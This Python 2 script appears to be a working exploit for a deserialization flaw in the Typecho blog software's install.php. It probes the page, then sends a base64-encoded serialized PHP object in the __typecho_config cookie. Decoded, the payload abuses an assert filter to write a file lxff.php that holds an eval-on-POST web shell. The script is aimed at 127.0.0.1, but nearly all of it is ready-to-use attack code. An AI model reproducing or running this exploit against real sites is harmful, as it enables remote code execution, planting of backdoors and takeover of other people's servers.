# -*- coding: utf-8 -*-
import urllib
import urllib2

#print("输入域名：")
#yuming=raw_input()
http="http://127.0.0.1"+"/install.php/?finish=1"
print("testing网站："+http)
request=urllib2.Request(http)
response=urllib2.urlopen(request)
if response.code==200:
    print("OK!")
else:print("OH no!")   #检测网站是否存在漏洞

payload="YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiVHlwZWNob19GZWVkX3R5cGUiO3M6ODoiQVRPTSAxLjAiO3M6MjI6IlR5cGVjaG9fRmVlZF9jaGFyc2V0IjtzOjU6IlVURi04IjtzOjE5OiJUeXBlY2hvX0ZlZWRfbGFuZyI7czoyOiJ6aCI7czoyMDoiVHlwZWNob19GZWVkX2l0ZW1zIjthOjE6e2k6MDthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IlR5cGVjaG9fUmVxdWVzdF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo1OToiZmlsZV9wdXRfY29udGVudHMoJ2x4ZmYucGhwJywgJzw/cGhwIEBldmFsKCRfUE9TVFtseGZdKTs/PicpIjt9czoyNDoiVHlwZWNob19SZXF1ZXN0X2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="
#value={}
#value['Cookie']="__typecho_config="+payload
#value['Referer']="http://"+"127.0.0.1"+"/install.php"
#value['Accept-Language']="zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"
#value['User-Agent']="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0"
#value['Accept']="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
#value['Connection']="close"
#value['Cache-Control']="max-age=0"

header={
'Host': '127.0.0.1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
'Cookie': '_ga=GA1.1.1555531315.1500432809; 8u2_sid=8876K8; __typecho_lang=zh_CN;__typecho_config='+payload,
'Connection': 'close',
'Referer':'http://127.0.0.1/install.php',
'Upgrade-Insecure-Requests': '1',
'Cache-Control': 'max-age=0'
}
print header
request = urllib2.Request(http,headers=header)
response = urllib2.urlopen(request)
print response.read()
print response.code

